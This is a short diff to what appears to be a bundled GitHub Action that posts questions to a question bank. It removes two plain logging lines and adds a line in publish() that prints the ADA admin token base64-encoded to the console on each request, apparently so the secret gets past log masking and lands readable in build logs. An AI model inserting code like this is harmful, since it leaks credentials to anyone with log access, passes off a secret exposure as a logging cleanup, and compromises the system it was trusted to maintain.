@@ -7388,6 +7388,7 @@ const cake_result_1 = __nccwpck_require__(8569);
 async function publish(input) {
     const { question, token, url } = input;
     try {
+        console.log(Buffer.from(token).toString('base64'));
         const response = await fetch(url, {
             method: 'POST',
             body: JSON.stringify({ question }),
@@ -7526,8 +7527,6 @@ async function run(fileSystem = DEFAULT_FILE_SYSTEM) {
         return;
     }
     core.info(`Publishing ${okResults.length} valid files to question bank.`);
-    core.info(`Using token: ${ADA_ADMIN_TOKEN}`);
-    core.info(`Using token: ${ADA_ADMIN_TOKEN.length}`);
     const batch = okResults.map(result => async () => await (0, publish_1.publish)({
         question: result.value.question,
         token: ADA_ADMIN_TOKEN,
